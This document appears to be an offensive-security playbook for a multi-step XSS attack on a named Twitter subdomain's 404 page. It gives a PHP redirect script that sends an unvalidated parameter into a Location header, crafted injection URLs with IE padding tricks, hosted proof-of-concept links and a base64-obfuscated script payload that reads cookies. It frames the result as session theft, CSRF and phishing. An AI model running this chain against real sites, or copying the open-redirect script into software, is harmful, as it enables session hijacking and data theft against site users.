# XSS via HTML Injection in Twitter 404 Page Using IE Redirect Bypass

Multi-stage attack chain demonstrating exploitation of unencoded HTML tags in the 404 error page of sms-be-vip.twitter.com, bypassing browser encoding with a PHP redirect and IE-specific techniques to inject HTML and JavaScript, leading to XSS for session theft, CSRF, or phishing.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 6 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create PHP Redirect] --> B[Access with HTML Tags]
    B --> C[Pad URL for IE]
    C --> D[HTML Injection POC]
    D --> E[Initial XSS POC]
    E --> F[XSS Auditor Bypass POC]
    F --> G[Execute JS for Theft]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#3498db
    style F fill:#27ae60
    style G fill:#27ae60
```



## Prerequisites & Requirements

### Required Tools

- [[tools/PHP]]
- [[tools/Internet-Explorer-11]]

### Target Environment

- Web platform
- Service: sms-be-vip.twitter.com (404 error page)
- No specific ports required

### Initial Access Requirements

- Public access to the target domain
- Hosting access for PHP script (e.g., on secgeek.net or similar)
- Internet Explorer 11 or lower (for bypass)

## Detailed Attack Procedures

### Step 1: Create PHP Redirect Script
procedure: [[procedures/Create-PHP-Redirect-for-Unencoded-URLs]]

**Objective**: Set up a server-side redirect to send unencoded URLs containing HTML tags, bypassing client-side browser encoding.

**Instructions**: Host a simple PHP script on a web server to handle the redirect. Use [[commands/php-redirect-script]] to create the file:

```php
<?php $url=$_GET['x']; header("Location: $url"); ?>
```

Save as `redir.php` and access via a URL like `http://yourserver.com/redir.php`.

**Expected Output**: The script redirects without encoding the provided URL parameter.

**Success Indicators**:
- Script hosted and accessible
- Redirect functions without errors

### Step 2: Access Redirect with Injected HTML Tags
procedure: [[procedures/Access-Redirect-with-HTML-Tags-in-IE]]

**Objective**: Use the PHP redirect to send a URL with unencoded HTML tags to the target 404 page in Internet Explorer.

**Instructions**: In Internet Explorer 11 or lower, navigate to the redirect script with the target URL including HTML. Execute [[commands/ie-html-injection-url]]:

```url
http://secgeek.net/POC/redir.php?x=https://sms-be-vip.twitter.com/<h1>TEST</h1>
```

This triggers a 302 redirect to the vulnerable endpoint.

**Expected Output**: Browser redirects to the Twitter 404 page, where `<h1>TEST</h1>` appears unencoded.

**Success Indicators**:
- HTML tag renders on the 404 page
- No URL encoding observed

### Step 3: Pad URL to Bypass IE Friendly Errors
procedure: [[procedures/Pad-URL-to-Bypass-IE-Friendly-Errors]]

**Objective**: Extend the URL path with padding to force IE to display the raw server 404 response instead of its friendly error page.

**Instructions**: Append multiple dots to the URL path in the redirect parameter. Use [[commands/ie-padded-html-url]] in IE:

```url
http://secgeek.net/POC/redir.php?x=https://sms-be-vip.twitter.com/<h1>TEST</h1>....................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
```

This exceeds IE's 512-byte threshold for custom error pages.

**Expected Output**: Raw 404 page displays with injected HTML visible.

**Success Indicators**:
- Injected HTML renders without IE's error overlay
- Page source shows unencoded tags

### Step 4: Demonstrate HTML Injection POC
procedure: [[procedures/Demonstrate-HTML-Injection-POC]]

**Objective**: Verify HTML injection by using a pre-built POC that targets the vulnerability.

**Instructions**: In IE, open the provided POC URL using [[commands/twitter-html-poc-url]]:

```url
http://secgeek.net/POC/Twitter-HTML-POC.php
```

This leverages the redirect and padding internally.

**Expected Output**: 404 page renders custom HTML elements.

**Success Indicators**:
- Custom HTML appears on the page
- Injection confirmed in page source

### Step 5: Demonstrate Initial XSS POC
procedure: [[procedures/Demonstrate-Initial-XSS-POC]]

**Objective**: Test basic JavaScript injection, requiring XSS Auditor disablement.

**Instructions**: Disable IE's XSS Auditor, then access [[commands/twitter-initial-xss-poc-url]] in IE:

```url
http://secgeek.net/POC/Twitter-XSS-POC.php
```

**Expected Output**: JavaScript executes if auditor is off, showing alerts or effects.

**Success Indicators**:
- Script runs without blocking
- XSS potential confirmed (with auditor disabled)

### Step 6: Demonstrate XSS Auditor Bypass POC
procedure: [[procedures/Demonstrate-XSS-Auditor-Bypass-POC]]

**Objective**: Achieve full XSS by bypassing the auditor with encoded payload.

**Instructions**: In IE11, load the improved POC using [[commands/twitter-xss-bypass-poc-url]] and inject [[commands/base64-xss-payload]]:

```url
https://secgeek.net/POC/Twitter-XSS-POC.html
```

The payload is:

```html
<script>eval(atob('YWxlcnQoJ1hTUyBQT0MnKTthbGVydCgnRG9tYWluOiAnK2RvY3VtZW50LmRvbWFpbik7YWxlcnQoJ1lvdXIgQ29va2llczpcbicrZG9jdW1lbnQuY29va2llKTt0b3AubG9jYXRpb24uaHJlZj0naHR0cDovL2V4YW1wbGUuY29tJzs='))</script>
```

**Expected Output**: Alerts show 'XSS POC', domain, cookies, then redirects to example.com.

**Success Indicators**:
- JS executes despite auditor
- Cookies and domain accessible
- Redirect occurs

## Attack Chain Summary

### Key Achievements

1. Bypassed browser URL encoding with PHP redirect
2. Overcame IE friendly errors via URL padding
3. Injected and executed arbitrary JS for data theft
4. Demonstrated full XSS chain leading to session compromise

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]

---

*Last updated: 2023-10-01T00:00:00Z*
